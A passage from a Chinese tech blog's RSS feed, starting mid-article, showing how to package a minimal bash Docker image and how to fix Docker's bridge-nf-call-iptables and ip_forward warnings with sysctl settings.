<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -cvf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ../bash.tar</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> *</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ..</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>压缩包近3.5M</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3.5M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 18</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:25</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash.tar</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>导入</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash.tar</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jockerdragon/mini_bash:5.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sha256:7cc56da0013130d77639ffb0c137ac755d66dc39474d7321ae9642e7ebb1d0fb</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>运行和测试</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># docker run -it jockerdragon/mini_bash:5.0 bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">!          ]]         break      command    coproc     </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       esac       false      </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">         local</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      pushd</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      return</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">     source</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">     times</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      ulimit</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">     wait</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         alias</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      builtin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    compgen</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    declare</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       fc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         getopts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         logout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     pwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     suspend</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    trap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       umask</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      while</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          bash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       caller</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     complete</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   dirs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       elif</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       fg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         hash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       jobs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       mapfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    read</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        test</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">       true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       unalias</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[          bg         case       compopt    disown     </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       exit       </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">         help       kill       popd       readarray  shift      </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       type       unset      }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[[         bind       cd         continue   </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">         enable     export     for        history    let        printf     readonly   shopt      </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">time</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       typeset    until</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]# pwd</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]# times</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">0m0.016s 0m0.016s</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">0m0.002s 0m0.001s</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>制作过程</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/lib/terminfo/x/xterm:/lib/terminfo/x/xterm</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# ldd */*/*</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/x:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ldd:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lib/terminfo/x:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> regular</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc-2.31.so:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f095b3dd000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffd18dad000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc.so.6:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f5b66c6e000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffe385fc000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl-2.31.so:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffeaf278000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fafd2433000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fafd2634000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl.so.2:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fff1b3f6000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f6332566000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f6332767000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffd91d81000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fa907fe9000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fa908214000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6.2:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffe46d77000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f461ee4c000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f461f077000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/bin/bash:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffd49df6000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libtinfo.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libtinfo.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5d24000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libdl.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libdl.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5d1e000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5b2c000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5e89000)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# docker run -it --rm  jockerdragon/bash:5.0 bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@d3af07f8866b /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@d3af07f8866b /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# tar -cvf ../bash.tar *</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">etc/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">etc/bash.bashrc</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc-2.31.so</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl-2.31.so</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl.so.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc.so.6</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/x/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/x/xterm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib64/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib64/ld-linux-x86-64.so.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# docker import ../bash.tar</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sha256:dfdc13f29846288fc47e830dd687e28978efc1fbf7888165a7fbf72560dcacbc</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker报错bridge-nf-call-iptables内核修整</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E6%8A%A5%E9%94%99bridge-nf-call-iptables%E5%86%85%E6%A0%B8%E4%BF%AE%E6%95%B4.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E6%8A%A5%E9%94%99bridge-nf-call-iptables%E5%86%85%E6%A0%B8%E4%BF%AE%E6%95%B4.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker报错bridge-nf-call-iptables内核修整</source>
      <description>Docker报错bridge-nf-call-iptables内核修整 bridge-nf-call-iptables 1）警告信息如下： 2）解决方法： 修改系统文件是的机器bridge模式开启 设置机器开机启动的时候执行下面两条命令 编辑vim /etc/rc.d/rc.local添加下面两条命令 CentOS 7需要增加执行权限： 3)I sol...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>bridge-nf-call-iptables</h2>
<p>1）警告信息如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WARNING:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bridge-nf-call-iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disabled</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WARNING:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bridge-nf-call-ip6tables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> disabled</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）解决方法：</p>
<p>修改系统文件是的机器bridge模式开启</p>
<p>设置机器开机启动的时候执行下面两条命令</p>
<p>编辑vim /etc/rc.d/rc.local添加下面两条命令</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/sys/net/bridge/bridge-nf-call-iptables</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/sys/net/bridge/bridge-nf-call-ip6tables</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>CentOS 7需要增加执行权限：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x　/etc/rc,d/rc.local</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>3)I solve this problem by execting two commands:</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sysctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> net.bridge.bridge-nf-call-iptables=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sysctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> net.bridge.bridge-nf-call-ip6tables=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>4）必须写进去报错才会消失，如果没消失，检查selinux和firewalld是否有其他阻碍的规则 /etc/sysctl.conf</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.bridge.bridge-nf-call-ip6tables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.bridge.bridge-nf-call-iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>net.ipv4.ip_forward</h2>
<p>解决方法：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/lib/sysctl.d/00-system.conf</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#添加如下代码：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.ip_forward</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker日志配置对已运行容器不生效</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E5%AF%B9%E5%B7%B2%E8%BF%90%E8%A1%8C%E5%AE%B9%E5%99%A8%E4%B8%8D%E7%94%9F%E6%95%88.html</link>
